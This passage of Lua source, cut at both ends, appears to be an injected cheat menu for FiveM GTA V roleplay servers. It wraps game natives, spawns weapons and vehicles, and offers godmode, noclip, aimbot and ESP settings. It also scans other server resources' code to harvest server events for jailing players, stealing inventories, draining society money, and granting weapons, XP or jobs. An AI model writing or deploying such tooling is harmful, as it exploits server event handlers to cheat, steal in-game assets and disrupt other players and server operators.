        return CIT.InvokeNative(0x6C188BE134E074AA, tostring(text))
    end
    function Winnie_SetGameplayCamRelativeRotation (roll, pitch, yaw)
        return CIT.InvokeNative(0x48608C3464F58AB4, roll, pitch, yaw)
    end
    function Winnie_GetResourceState (resourceName)
        return CIT.InvokeNative(0x4039b485, tostring(resourceName), CIT.ReturnResultAnyway(), CIT.ResultAsString())
    end
    function Winnie_GetGroundZFor_3dCoord (x, y, z)
        return CIT.InvokeNative(0xC906A7DAB05C8D2B, x, y, z, CIT.PointerValueFloat(), CIT.ReturnResultAnyway())
    end
    function Winnie_SetBlipSprite (blip, spriteId)
        return CIT.InvokeNative(0xDF735600A4696DAF, blip, spriteId)
    end
    function Winnie_SetCamActive (cam, active)
        return CIT.InvokeNative(0x026FB97D0A425F84, cam, active)
    end
    function Winnie_SetFocusEntity (entity)
        return CIT.InvokeNative(0x198F77705FA0931D, entity)
    end
    function Winnie_GetDisabledControlNormal (p0, p1)
        return CIT.InvokeNative(0x11E65974A982637C, p0, p1, CIT.ReturnResultAnyway(), CIT.ResultAsFloat())
    end
    function Winnie_GetEntityRotation (entity, p1)
        return CIT.InvokeNative(0xAFBD61CC738D9EB9, entity, p1, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function Winnie_SetCamRot (cam, rotX, rotY, rotZ, p4)
        return CIT.InvokeNative(0x85973643155D0B07, cam, rotX, rotY, rotZ, p4)
    end
    function Winnie_GetOffsetFromEntityInWorldCoords (entity, xOffset, yOffset, zOffset)
        return CIT.InvokeNative(
            0x1899F328B0E12848,
            entity,
            xOffset,
            yOffset,
            zOffset,
            CIT.ReturnResultAnyway(),
            CIT.ResultAsVector()
        )
    end
    function Winnie_GetEntityVelocity (entity)
        return CIT.InvokeNative(0x4805D2B1D8CF94A9, entity, CIT.ReturnResultAnyway(), CIT.ResultAsVector())
    end
    function  Winnie_GetCurrentPedWeaponEntityIndex (ped)
        return CIT.InvokeNative(0x3B390A939AF0B5FC, ped)
    end
    function Winnie_PlaySoundFromCoord(p1,p2,p3,p4,p5,p6,p7,p8,p9)
        return CIT.InvokeNative(0x8D8686B622B88120, p1, tostring(p2), p3, p4, p5, tostring(p6), p7, p8, p9)
    end
    function Winnie_GetCurrentPedWeapon (ped, p2)
        return CIT.InvokeNative(0x3A87E44BB9A01D54, ped, CIT.PointerValueInt(), p2, CIT.ReturnResultAnyway())
    end
    function Winnie_TriggerServerEventInternal (eventName, eventPayload, payloadlength)
        return CIT.InvokeNative(0x7FDD1128, tostring(eventName), tostring(eventPayload), payloadlength)
    end
    function Winnie_DisablePlayerFiring (player, toggle)
        return CIT.InvokeNative(0x5E6CC07646BBEAB8, player, toggle)
    end
    function Winnie_SetVehicleGravityAmount (vehicle, gravity)
        return CIT.InvokeNative(0x1a963e58, vehicle, gravity)
    end
    function Winnie_DrawLine (x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
        return CIT.InvokeNative(0x6B7256074AE34680, x1, y1, z1, x2, y2, z2, red, green, blue, alpha)
    end
    function GetActivePlayers()
        return msgpack.unpack(CIT.InvokeNative(0xcf143fb9, CIT.ReturnResultAnyway(), CIT.ResultAsObject()))
    end


    local availableZombies = {
        {name = "Zombie 01", model = "s_m_m_marine_01"},
        {name = "Zombie 02", model = "s_m_y_marine_01"},
        {name = "Zombie 03", model = "a_m_m_mexcntry_01"},
        {name = "Zombie 04", model = "a_m_m_polynesian_01"},
        {name = "Zombie 05", model = "a_m_m_skidrow_01"},
        {name = "Zombie 06", model = "a_m_y_genstreet_01"},
        {name = "Zombie 07", model = "a_m_y_genstreet_02"},
        {name = "Zombie 08", model = "a_m_y_stlat_01"},
        {name = "Zombie 09", model = "csb_ramp_hic"},
        {name = "Zombie 10", model = "a_m_m_fatlatin_01"},
        {name = "Zombie 11", model = "a_m_m_rurmeth_01"},
        {name = "Zombie 12", model = "a_m_m_hillbilly_02"},
        {name = "Zombie 13", model = "a_m_m_hillbilly_01"},
        {name = "Zombie 14", model = "s_m_y_prisoner_01"},
        {name = "Zombie 15", model = "s_m_y_prismuscl_01"},
        {name = "Zombie 16", model = "a_m_m_salton_01"},
        {name = "Zombie 17", model = "a_m_y_salton_01"},
        {name = "Zombie 18", model = "copZ"},
        {name = "Zombie 19", model = "DocZ"},
        {name = "Zombie 20", model = "HcopZ"},
        {name = "Zombie 21", model = "ParaZ"},
    }






    local kibind = true
    local kibindglife = true
    local teleporttovehicle = {["BindingTouch"] = "?", ["Value"] = 11}
    local warpthevehicle = {["BindingTouch"] = "?", ["Value"] = 5}
    local healglife = {["BindingTouch"] = "?", ["Value"] = 5}
    local revivebind = {["BindingTouch"] = "?", ["Value"] = 5}
    local revivebind2 = {["BindingTouch"] = "?", ["Value"] = 5}
    local armorbind = {["BindingTouch"] = "?", ["Value"] = 5}
    local freecambind = {["BindingTouch"] = "?", ["Value"] = 5}
    local noclipbind = {["BindingTouch"] = "?", ["Value"] = 5}
    local autofrm = {["BindingTouch"] = "?", ["Value"] = 5}
    local godmodebind = {["BindingTouch"] = "?", ["Value"] = 5}
    local invisiblebind = {["BindingTouch"] = "?", ["Value"] = 5}
    local healthkeybind = {["BindingTouch"] = "?", ["Value"] = 5}
    local oooopppppppeeeeeeeen = {["BindingTouch"] = "Nothing", ["Value"] = 5}
    local keyboardui = {["BindingTouch"] = "Nothing", ["Value"] = 5}
    local externalmenui = {["BindingTouch"] = "Nothing", ["Value"] = 5}


    local Keys = {['ESC'] = 322, ['F1'] = 288, ['F2'] = 289, ['F3'] = 170, ['F5'] = 166, ['F6'] = 167, ['F7'] = 168, ['F8'] = 169, ['F9'] = 56, ['F10'] = 57, ['F11'] = 344, ['`'] = 243, ['1'] = 157, ['2'] = 158, ['3'] = 160, ['4'] = 164, ['5'] = 165, ['6'] = 159, ['7'] = 161, ['8'] = 162, ['9'] = 163, ['-'] = 84, ['='] = 83, ['BSPACE'] = 177, ['TAB'] = 37, ['Q'] = 44, ['W'] = 32, ['E'] = 38, ['R'] = 45, ['T'] = 245, ['Y'] = 246, ['U'] = 303, ['P'] = 199, ['['] = 39, [']'] = 40, ['ENTER'] = 191, ['CAPS'] = 137, ['A'] = 34, ['S'] = 8, ['D'] = 9, ['F'] = 23, ['G'] = 47, ['H'] = 74, ['K'] = 311, ['L'] = 182, ['LTSHIFT'] = 21, ['Z'] = 20, ['X'] = 73, ['C'] = 26, ['V'] = 0, ['B'] = 29, ['N'] = 249, ['M'] = 244, [','] = 82, ['.'] = 81, ['LTCTRL'] = 36, ['LTALT'] = 19, ['SPACE'] = 22, ['RCTRL'] = 70, ['HOME'] = 213, ['PAGEUP'] = 10, ['PAGEDOWN'] = 11, ['DELETE'] = 178, ['LEFT'] = 174, ['RIGHT'] = 175, ['TOP'] = 27, ['UP'] = 172, ['DOWN'] = 173, ['NENTER'] = 201, ['N4'] = 108, ['N5'] = 60, ['N6'] = 107, ['N+'] = 96, ['N-'] = 97, ['N7'] = 117, ['N8'] = 111, ['N9'] = 118, ['MOUSE1'] = 24}
    local Key={["Esc"]=322,["F1"]=288,["F2"]=289,["F3"]=170,["F5"]=166,["F6"]=167,["F7"]=168,["F8"]=169,["F9"]=56,["F10"]=57,["~"]=243,["1"]=157,["2"]=158,["3"]=160,["4"]=164,["5"]=165,["6"]=159,["7"]=161,["8"]=162,["9"]=163,["-"]=84,["="]=83,["Back Space"]=177,["Tab"]=37,["Q"]=44,["W"]=32,["E"]=38,["R"]=45,["T"]=245,["Y"]=246,["U"]=303,["P"]=199,["["]=39,["]"]=40,["Caps"]=137,["A"]=34,["S"]=8,["D"]=9,["F"]=23,["G"]=47,["H"]=74,["K"]=311,["L"]=182,["Left Shift"]=21,["Z"]=20,["X"]=73,["C"]=26,["V"]=0,["B"]=29,["N"]=249,["M"]=244,[","]=82,["."]=81,["Left Ctrl"]=36,["Left Alt"]=19,["Space"]=22,["Right Ctrl"]=70,["Home"]=213,["Page Up"]=10,["Page Down"]=11,["Delete"]=178,["Left"]=174,["Right"]=175,["Top"]=27,["Down"]=173,["N4"]=108,["N5"]=60,["N6"]=107,["N+"]=96,["N-"]=97,["N7"]=117,["N8"]=61,["N9"]=118}
    local Keyred ={["Tab"]=0x09,["Backspace"]=0x08,["Escape"]=0x1B,["Space"]=0x20,["Left"]=0x25,["Up"]=0x26,["Right"]=0x27,["Down"]=0x28,["Insert"]=0x2D,["Delete"]=0x2E,["PageUp"]=0x21,["PageDown"]=0x22,["Home"]=0x24,["End"]=0x23,["F1"]=0x70,["F2"]=0x71,["F3"]=0x72,["F4"]=0x73,["F5"]=0x74,["F6"]=0x75,["F7"]=0x76,["F8"]=0x77,["F9"]=0x78,["F10"]=0x79,["F11"]=0x7A,["F12"]=0x7B,["B"]=0x42,["C"]=0x43,["D"]=0x44,["E"]=0x45,["F"]=0x46,["G"]=0x47,["H"]=0x48,["I"]=0x49,["J"]=0x4A,["K"]=0x4B,["L"]=0x4C,["M"]=0x4D,["N"]=0x4E,["O"]=0x4F,["P"]=0x50,["Q"]=0x51,["R"]=0x52,["S"]=0x53,["T"]=0x54,["U"]=0x55,["V"]=0x56,["W"]=0x57,["X"]=0x58,["Y"]=0x59,["Z"]=0x5A,["0"]=0x30,["1"]=0x31,["2"]=0x32,["3"]=0x33,["4"]=0x34,["5"]=0x35,["6"]=0x36,["7"]=0x37,["8"]=0x38,["9"]=0x39,["-"]=0xBD,["="]=0xBB,["["]=0xDB,["]"]=0xDD,["\\"]=0xDC,[";"]=0xBA,["'"]=0xDE,["/"]=0xBF,["."]=0xBE,["`"]=0xC0,[","]=0xBC,["."]=0xBE,["~"]=0xC1,["!"]=0x21,["@"]=0x40,["#"]=0x23,["$"]=0x24,["%"]=0x25,["^"]=0x5E,["&"]=0x26,["*"]=0x2A,["("]=0x28,[")"]=0x29,["_"]=0x5F,["+"]=0x2B,["{"]=0x7B,["}"]=0x7D,["|"]=0x7C,["["]=0x5B,["]"]=0x5D,["\""]=0x22,["<"]=0x3C}





    local vehicle = {
        vehicle1 = {
            {name = "Kurama2", button = "Kurama Armored"},
            {name = "Raptor", button = "Raptor"},
            {name = "Verlierer2", button = "Verlierer2"},
            {name = "BType", button = "BType"},
            {name = "Mamba", button = "Mamba"},
            {name = "StingerGT", button = "StingerGT"},
            {name = "ZType", button = "ZType"},
            {name = "GP1", button = "GP1"},
            {name = "T20", button = "T20"},
            {name = "Italigtb2", button = "Italigtb2"},
            {name = "Turismo2", button = "Turismo2"},
            {name = "SultanRS", button = "SultanRS"},
            {name = "SultanRS", button = "SultanRS"},
            {name = "Voltic", button = "Voltic"},
        },

        vehicle2 = {
            {name = "Mesa3", button = "Mesa3"},
            {name = "brioso", button = "Brioso"},
            {name = "Contender", button = "Contender"},
            {name = "Baller2", button = "Baller"},
            {name = "BJXL", button = "BJXL"},
            {name = "Dubsta", button = "Dubsta"},
            {name = "XLS", button = "XLS"},
            {name = "Fugitive", button = "Fugitive"},
            {name = "Primo", button = "Primo"},
            {name = "Taxi", button = "Taxi"},
            {name = "Banshee", button = "Banshee"},
            {name = "BestiaGTS", button = "BestiaGTS"},
            {name = "prairie", button = "Prairie"},
            {name = "Comet3", button = "Comet3"},
            {name = "Kuruma", button = "Kuruma"},
        },

        vehicle3 = {
            {name = "Exemplar", button = "Exemplar"},
            {name = "Felon", button = "Felon"},
            {name = "Jackal", button = "Jackal"},
            {name = "Oracle", button = "Oracle"},
            {name = "Sentinel", button = "Sentinel"},
            {name = "Zion", button = "Zion"},
            {name = "Dominator", button = "Dominator"},
            {name = "Dukes2", button = "Dukes2"},
            {name = "Gauntlet", button = "Gauntlet"},
            {name = "Moonbeam", button = "Moonbeam"},
            {name = "SlamVan", button = "SlamVan"},
            {name = "Voodoo", button = "Voodoo"},
            {name = "Ruiner", button = "Ruiner"},
            {name = "BfInjection", button = "BfInjection"},
            {name = "Dune", button = "Dune"},
            {name = "Marshall", button = "Marshall"},
        },
        vehicle4 = {
            {name = "Bison", button = "Bison"},
            {name = "BobcatXL", button = "BobcatXL"},
            {name = "Boxville", button = "Boxville"},
            {name = "Burrito", button = "Burrito"},
            {name = "Camper", button = "Camper"},
            {name = "Journey", button = "Journey"},
            {name = "Minivan", button = "Minivan"},
            {name = "Paradise", button = "Paradise"},
            {name = "Speedo", button = "Speedo"},
            {name = "Surfer", button = "Surfer"},
            {name = "Taco", button = "Taco"},
            {name = "Speedo2", button = "Clown Van"},
            {name = "Sadler", button = "Sadler"},
            {name = "Tractor2", button = "Tractor2"},
            {name = "TowTruck", button = "TowTruck"},
        },
    }

    local weaponTable = {
        arfzafagfagfaga = {
            {name = "weapon_pistol", button = "Pistol"},
            {name = "weapon_pistol_mk2", button = "Pistol MK2"},
            {name = "weapon_combatpistol", button = "Combat Pistol"},
            {name = "weapon_snspistol", button = "SNS Pistol"},
            {name = "weapon_snspistol_mk2", button = "SNS Pistol MK2"},
            {name = "weapon_vintagepistol", button = "Vintage Pistol"},
            {name = "weapon_appistol", button = "AP Pistol"},
            {name = "weapon_stungun", button = "Stun Gun"},
            {name = "weapon_pistol50", button = "Pistol 50"},
            {name = "weapon_revolver_mk2", button = "Revolver MK2"},
            {name = "weapon_marksmanpistol", button = "Marksman Pistol"},
            {name = "weapon_ceramicpistol", button = "Ceramic Pistol"},
            {name = "weapon_raypistol", button = "Ray Pistol"},
            {name = "weapon_doubleaction", button = "Double Action"},
            {name = "weapon_navyrevolver", button = "Navy Revolver"},
            {name = "weapon_gadgetpistol", button = "Gadget Pistol"},
            {name = "weapon_heavypistol", button = "Heavy Pistol"},
            {name = "weapon_carbine", button = "Carabine"},
        },

        weapon2 = {
            {name = "weapon_dagger", button = "Dagger"},
            {name = "weapon_bat", button = "Bat"},
            {name = "weapon_bottle", button = "Bottle"},
            {name = "weapon_flashlight", button = "Flashlight"},
            {name = "weapon_golfclub", button = "Golfclub"},
            {name = "weapon_hammer", button = "Hammer"},
            {name = "weapon_hatchet", button = "Hatchet"},
            {name = "weapon_knuckle", button = "Knuckle"},
            {name = "weapon_knife", button = "Knife"},
            {name = "weapon_machete", button = "Machette"},
            {name = "weapon_switchblade", button = "Switchblade"},
            {name = "weapon_nightstick", button = "Nightstick"},
            {name = "weapon_wrench", button = "Wrench"},
            {name = "weapon_battleaxe", button = "Battleaxe"},
            {name = "weapon_poolcue", button = "Poolcue"},
            {name = "weapon_stone_hatchet", button = "Hatchet Stone"},
        },

        weapon3 = {
            {name = "weapon_assaultrifle", button = "Assault Rifle"},
            {name = "weapon_assaultrifle_mk2", button = "Assault Rifle MK2"},
            {name = "weapon_carbinerifle", button = "Carbine Rifle"},
            {name = "weapon_carbinerifle_mk2", button = "Carbine Rifle MK2"},
            {name = "weapon_advancedrifle", button = "Advanced Rifle"},
            {name = "weapon_specialcarbine", button = "Special Carbine"},
            {name = "weapon_specialcarbine_mk2", button = "Special Carbine MK2"},
            {name = "weapon_bullpuprifle", button = "Bullpup Rifle"},
            {name = "weapon_compactrifle", button = "Compact Rifle"},
            {name = "weapon_gusenberg", button = "Gusenberg"},
        },
        weapon4 = {
            {name = "weapon_smg", button = "SMG"},
            {name = "weapon_microsmg", button = "Micro SMG"},
            {name = "weapon_smg_mk2", button = "Smg MK2"},
            {name = "weapon_assaultsmg", button = "Assault SMG"},
            {name = "weapon_combatpdw", button = "Combat PDW"},
            {name = "weapon_machinepistol", button = "Machine Pistol"},
            {name = "weapon_minismg", button = "Mini SMG"},
        },
        weapon5 = {
            {name = "weapon_rpg", button = "RPG"},
            {name = "weapon_grenadelauncher", button = "Grenade Launcher"},
            {name = "weapon_grenadelauncher_smoke", button = "Grenade Launcher S"},
            {name = "weapon_minigun", button = "Minigun"},
            {name = "weapon_firework", button = "Firework"},
            {name = "weapon_railgun", button = "Railgun"},
            {name = "weapon_hominglauncher", button = "Homing Launcher"},
            {name = "weapon_compactlauncher", button = "Compact Launcher"},
            {name = "weapon_rayminigun", button = "Rayminigun"},
            {name = "weapon_sniperrifle", button = "Sniper Rifle"},
            {name = "weapon_heavysniper", button = "Heavy Sniper"},
            {name = "weapon_heavysniper_mk2", button = "Heavy Sniper MK2"},
            {name = "weapon_marksmanrifle", button = "Marksmanrifle"},
            {name = "weapon_marksmanrifle_mk2", button = "Marksmanrifle MK2"},
        },
    }




    local function RemoveChar(string) -- remove TriggerServerEvent(%)
        if string:find("'") then
            local a, b = string.find(string, "%b''")
            string = string:sub(a + 1, b - 1)
        elseif string:find('"') then
            local a, b = string.find(string, '%b""')
            string = string:sub(a + 1, b - 1)
        end
        return string
    end

    local function SearchInSplit(str, pat, limit)
        local t = {}
        local fpat = "(.-)" .. pat
        local last_end = 1
        local s, e, cap = str:find(fpat, 1)
        while s do
          if s ~= 1 or cap ~= "" then
            table.insert(t, cap)
          end

          last_end = e+1
          s, e, cap = str:find(fpat, last_end)

          if limit ~= nil and limit <= #t then
            break
            end
        end

        if last_end <= #str then
          cap = str:sub(last_end)
          table.insert(t, cap)
        end

        return t
    end


    local function yepcock(file, event, char)

        local searchInfile = LoadResourceFile(file, 'fxmanifest.lua')
        if LoadResourceFile(file, "__resource.lua") then
            searchInfile = LoadResourceFile(file, '__resource.lua')
        end

        if searchInfile then
            for k, v in ipairs(SearchInSplit(searchInfile, "\n")) do
                local findFile, findFile = string.find(v, ".lua", 1, true)
                if findFile then
                    local thesearchInfile = LoadResourceFile(file, RemoveChar(v))
                    if thesearchInfile then
                        for k,clearString in ipairs(SearchInSplit(thesearchInfile, "\n")) do
                            if string.match(clearString, event) then
                                foundTrigger = RemoveChar(clearString)
                            end
                            if string.match(clearString, char) and foundTrigger then
                                return foundTrigger

                            end
                        end

                    end

                end
            end
        end
        return nil
    end

    local jail_player = yepcock('esx-qalle-jail', 'TriggerServerEvent', 'GetPlayerServerId%(')
    local esx_policejob = yepcock('esx_policejob', 'TriggerServerEvent', 'society_police')
    local steal = yepcock('esx_inventoryhud', 'TriggerServerEvent', 'TakeFromPlayer')
    local carry_player = yepcock('CarryPeople', 'TriggerServerEvent', 'GetClosestPlayer%(')
    local piggyback = yepcock('PiggyBack', 'TriggerServerEvent', 'GetClosestPlayer%(')
    local take_hostage = yepcock('TakeHostage', 'TriggerServerEvent', 'GetClosestPlayer%(')
    local revive_ped = yepcock('esx_ambulancejob', 'AddEventHandler', 'RespawnPed%(playerPed')
    local refill_food = yepcock('esx_status', 'AddEventHandler', 'TriggerServerEvent%(')
    local jobs_civil_pays = yepcock('bucheron', 'TriggerServerEvent', 'jobs_civil:pay%(')
    local vangelico = yepcock('esx_holdup', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local vangelico = yepcock('esx_holdupbank', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local vangelico_bank = yepcock('esx_vangelico_robbery', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local mecano_harvest = yepcock('esx_mecanojob', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local annouce_police = yepcock('esx_policejob', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local remove_money_society = yepcock('esx_society', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local esx_ballas_weapon = yepcock('esx_ballasjob', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local esx_tabac_announce = yepcock('esx_tabac', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local blanchisseur2 = yepcock('blanchisseur', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local licensee = yepcock('esx_dmvschool', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local hostage = yepcock('f5', 'TriggerServerEvent', 'TriggerServerEvent%(')
    local esx_drugs = yepcock('esx_drugs', 'TriggerServerEvent', 'startHarvestCoke')
    local esx_drugs_sell = yepcock('esx_drugs', 'TriggerServerEvent', 'startSellCoke')
    local esx_drugs_transform = yepcock('esx_drugs', 'TriggerServerEvent', 'startTransformCoke')
    local esx_hifi = yepcock('esx_hifi', 'TriggerServerEvent', 'data.value, coords')
    local esx_car_wash = yepcock('esx_carwash', 'TriggerServerEvent', ', function%(price%)')
    local tp_all = yepcock('Badger_Tackle', 'TriggerServerEvent', ', GetPlayerServerId%(closestPlayer%)')
    local revive_player = yepcock('ambulancejob', 'TriggerServerEvent', ', GetPlayerServerId%(closestPlayer%)')
    local dpemote = yepcock('dpemotes', 'TriggerServerEvent', ', GetPlayerServerId%(target%), requestedemote, otheremote')
    local dpemote = yepcock('dp-emotes', 'TriggerServerEvent', ', GetPlayerServerId%(target%), requestedemote, otheremote')
    local ahahachef = yepcock('dp-emotes', 'TriggerServerEvent', 'esx:setJob')
    local aa = yepcock('AeroDefence', 'AddEventHandler', 'TriggerServerEvent')
    local GiveVehicle = yepcock('r4lz-utils', 'TriggerServerEvent', 'TriggerServerEvent')
    local SellWeapon = yepcock('r4lz-zombie', 'TriggerServerEvent', 'TriggerServerEvent')
    local GiveWeapon = yepcock('r4lz-zombie', 'TriggerServerEvent', 'TriggerServerEvent')
    local GiveXP = yepcock('r4lz-zombie', 'TriggerServerEvent', 'TriggerServerEvent')



    local rE_Slider = {}
    rE_Slider["Slider_specificammo_value"] = 1
    rE_Slider["Slider_sliderwidht_value"] = 1
    rE_Slider["Slider_jumpintensity_value"] = 0.2
    rE_Slider["Slider_smooth_value"] = 0.5
    rE_Slider["Slider_colorvehilcer_value"] = 0.35
    rE_Slider["Slider_colorvehilceg_value"] = 0.8
    rE_Slider["Slider_colorvehilceb_value"] = 0.3
    rE_Slider["Slider_espheight_value"] = 1
    rE_Slider["Slider_colorr_value"] = 1
    rE_Slider["Slider_colorg_value"] = 1
    rE_Slider["Slider_colorb_value"] = 1
    rE_Slider["Slider_valueworldcolor_value"] = 0.5
    rE_Slider["Slider_espdistance_value"] = 0.1
    rE_Slider["Slider_distanceaimlock_value"] = 0.5
    rE_Slider["Slider_damageaimbot_value"] = 0.15
    rE_Slider["Slider_ptfxscaleweapon_value"] = 0.5
    rE_Slider["Slider_fovaimlock_value"] = 0.1
    rE_Slider["Slider_speedvehicle_value"] = 0.5
    rE_Slider["Slider_explodetypeonline_value"] = 0.5
    rE_Slider["Slider_forcefly_value"] = 0.3
    rE_Slider["Slider_ptfxscalemisc_value"] = 0.5
    rE_Slider["Slider_explodetypemisc_value"] = 0.5
    rE_Slider["Slider_bagdistance_value"] = 0.5
    rE_Slider["Slider_bagcolorr_value"] = 1
    rE_Slider["Slider_bagcolorg_value"] = 0.295
    rE_Slider["Slider_bagcolorb_value"] = 0
    rE_Slider["Slider_colormenur_value"] = 0.18
    rE_Slider["Slider_colormenug_value"] = 0.3
    rE_Slider["Slider_colormenub_value"] = 0.83
    rE_Slider["Slider_freecamfov_value"] = 0.3
    rE_Slider["Slider_SPEED_value"] = 0.15
    rE_Slider["Slider_freecamsensi_value"] = 0.1
    rE_Slider["Slider_freecamspeed_value"] = 0.15
    rE_Slider["Slider_health_value"] = 1
    rE_Slider["Slider_armor_value"] = 0
    rE_Slider["Slider_wantedplayer_value"] = 0
    rE_Slider["Slider_sliderun_value"] = 0.555
    rE_Slider["Slider_opacityplayer_value"] = 1
    rE_Slider["Slider_propsopacity_value"] = 1
    rE_Slider["Slider_giveweapon_value"] = 1
    rE_Slider["Slider_Strafe_value"] = 0.7
    rE_Slider["Slider_fastrun_value"] = 0.98
    rE_Slider["Slider_launchplayer_value"] = 0.3
    rE_Slider["Slider_noclip_value"] = 0.3
    rE_Slider["Slider_opacityfillbox_value"] = 0.25
    rE_Slider["Slider_dmgplayer_value"] = 0.50

    local screenResolutionX, screenResolutionY = Winnie_GetNuiCursorPosition()
    local widht, height = Winnie_GetActiveScreenResolution()
    screenResolutionX = screenResolutionX / widht
    screenResolutionY = screenResolutionY / height

    local ReplaceXNice = {position = {x = 500, y = 500, w = 0, h = 0},cursor = {x = 0, y = 0},screen = {w = 0, h = 0}}
    ReplaceXNice.screen.w, ReplaceXNice.screen.h = CIT.InvokeNative(0x873C9F3104101DD3, CIT.PointerValueInt(), CIT.PointerValueInt())
    local function  AimeMilleMakeThis (x, y, r, g, b, a, text, font, centered, scale)
        CIT.InvokeNative(0x66E0276CC5F6B9DA, font) --Winnie_SetTextFont
        CIT.InvokeNative(0x07C837F9A01C34C9, scale, scale) --Winnie_SetTextScale
        CIT.InvokeNative(0xC02F4DBFB51D988B, centered) --Winnie_SetTextCentre
        CIT.InvokeNative(0xBE6B23FFA53FB442, r, g, b, a) --Winnie_SetTextColour
        CIT.InvokeNative(0x25FBB336DF1804CB, "STRING")
        CIT.InvokeNative(0x6C188BE134E074AA, text)
        Winnie_SetTextOutline()
        CIT.InvokeNative(0xCD015E5BB0D96A57, x / ReplaceXNice.screen.w, y / ReplaceXNice.screen.h)
    end
    local function  mouseBounds (E, F, G, H)
        ReplaceXNice.cursor.x, ReplaceXNice.cursor.y = Winnie_GetNuiCursorPosition()
        if
            ReplaceXNice.cursor.x > E and ReplaceXNice.cursor.y > F and ReplaceXNice.cursor.x < E + G and
                ReplaceXNice.cursor.y < F + H
        then
            return true
        end
        return false
    end


    local function GetSeatPedIsIn(ab)
        if not Winnie_IsPedInAnyVehicle(ab, false) then
            return
        else
            veh = Winnie_GetVehiclePedIsIn(ab)
            for z = 0, Winnie_GetVehicleMaxNumberOfPassengers(veh) do
                if Winnie_GetPedInVehicleSeat(veh) then
                    return z
                end
            end
        end
    end
    local function RequestControlOnce(aa)
        if not Winnie_NetworkIsInSession() or Winnie_NetworkHasControlOfEntity(aa) then
            return true
        end
        Winnie_SetNetworkIdCanMigrate(Winnie_NetworkGetNetworkIdFromEntity(aa), true)
        return Winnie_NetworkRequestControlOfEntity(aa)
    end

    local function Winnie_DrawRect2 (E, F, G, H, I, J, K, L)
        local p, q = G / ReplaceXNice.screen.w, H / ReplaceXNice.screen.h
        local M, N = E / ReplaceXNice.screen.w + p / 2, F / ReplaceXNice.screen.h + q / 2
        CIT.InvokeNative(0x3A618A217E5154F0, M, N, p, q, I, J, K, L)
    end
    local function Winnie_DrawSprite2 (O, P, E, F, G, H, Q, I, J, K, L)
        local p, q = G / ReplaceXNice.screen.w, H / ReplaceXNice.screen.h
        local M, N = E / ReplaceXNice.screen.w + p / 2, F / ReplaceXNice.screen.h + q / 2
        Winnie_DrawSprite(O, P, M, N, G, H, Q, I, J, K, L)
    end
    local function crampe(R, S, T)
        return math.min(math.max(R, S), T)
    end
    local function rainbow(frequency)
        local result = {}
        local curtime = Winnie_GetGameTimer() / 2000
        result.r = math.floor(math.sin(curtime * frequency + 0) * 127 + 128)
        result.g = math.floor(math.sin(curtime * frequency + 2) * 127 + 128)
        result.b = math.floor(math.sin(curtime * frequency + 4) * 127 + 128)
        return result
    end
    local function circlepoint(U, V)
        local W = 10 ^ (V or 0)
        return math.floor(U * W + 0.5) / W
    end

    local function cursor()
        local x, y = Winnie_GetNuiCursorPosition()
    local screenX, screenY = Winnie_GetActiveScreenResolution()
    local cursorX, cursorY = x / screenX, y / screenY
    if kibind and kibindglife ~= false then
        Winnie_DrawRect(cursorX, cursorY, 0.0058, 0.001, 255, 255, 255, 255)
        Winnie_DrawRect(cursorX, cursorY, 0.0011, 0.01, 255, 255, 255, 255)
    elseif ZM_M1000.Draw then
        --Winnie_DrawSprite('zeofkkezofkezofkzeko', 'azzaefzgergzeggez', cursorX,  cursorY + 0.011, 0.02, 0.02 * 1.8, 0.0, 255, 255, 255, New.opacity)
        redENGINE.DrawImage(cursortest, cursorX,  cursorY + 0.011, 0.03, 0.025);

    end
    end
    local  function shapeprout(bone)
        local retval, vvvv, xxx, aaaaa, zzzz = GetShapeTestResult(StartExpensiveSynchronousShapeTestLosProbe(GetFinalRenderedCamCoord(), bone, -1, nil, 0))
        if vvvv then
            return #(GetFinalRenderedCamCoord()-xxx) / #(GetFinalRenderedCamCoord()-bone) * 0.83
        else
            return 0.83
        end
    end
    local function bonnetoscreen(ped, boneId, offsetX, offsetY, offsetZ, size)
        local bone = Winnie_GetPedBoneCoords(ped, boneId, offsetX, offsetY, offsetZ)
        if (bone) then
            if (size > 1) then
                size = 0.9
            end
            return Winnie_GetFinalRenderedCamCoord()+((bone-Winnie_GetFinalRenderedCamCoord())*size)
        end
    end

    local function nocontrol()Winnie_DisableControlAction(1,36,true)Winnie_DisableControlAction(1,37,true)Winnie_DisableControlAction(1,38,true)Winnie_DisableControlAction(1,44,true)Winnie_DisableControlAction(1,45,true)Winnie_DisableControlAction(1,69,true)Winnie_DisableControlAction(1,70,true)Winnie_DisableControlAction(0,63,true)Winnie_DisableControlAction(0,64,true)Winnie_DisableControlAction(0,278,true)Winnie_DisableControlAction(0,279,true)Winnie_DisableControlAction(0,280,true)Winnie_DisableControlAction(0,281,true)Winnie_DisableControlAction(0,91,true)Winnie_DisableControlAction(0,92,true)Winnie_DisableControlAction(0,24,true)Winnie_DisableControlAction(0,25,true)Winnie_DisableControlAction(1,37,true)Winnie_DisableControlAction(0,58,true)Winnie_DisableControlAction(0,140,true)Winnie_DisableControlAction(0,141,true)Winnie_DisableControlAction(0,81,true)Winnie_DisableControlAction(0,82,true)Winnie_DisableControlAction(0,83,true)Winnie_DisableControlAction(0,84,true)Winnie_DisableControlAction(0,12,true)Winnie_DisableControlAction(0,13,true)Winnie_DisableControlAction(0,14,true)Winnie_DisableControlAction(0,15,true)Winnie_DisableControlAction(0,24,true)Winnie_DisableControlAction(0,16,true)Winnie_DisableControlAction(0,17,true)Winnie_DisableControlAction(0,96,true)Winnie_DisableControlAction(0,97,true)Winnie_DisableControlAction(0,98,true)Winnie_DisableControlAction(0,96,true)Winnie_DisableControlAction(0,99,true)Winnie_DisableControlAction(0,100,true)Winnie_DisableControlAction(0,142,true)Winnie_DisableControlAction(0,143,true)Winnie_DisableControlAction(0,263,true)Winnie_DisableControlAction(0,264,true)Winnie_DisableControlAction(0,257,true)Winnie_DisableControlAction(1,26,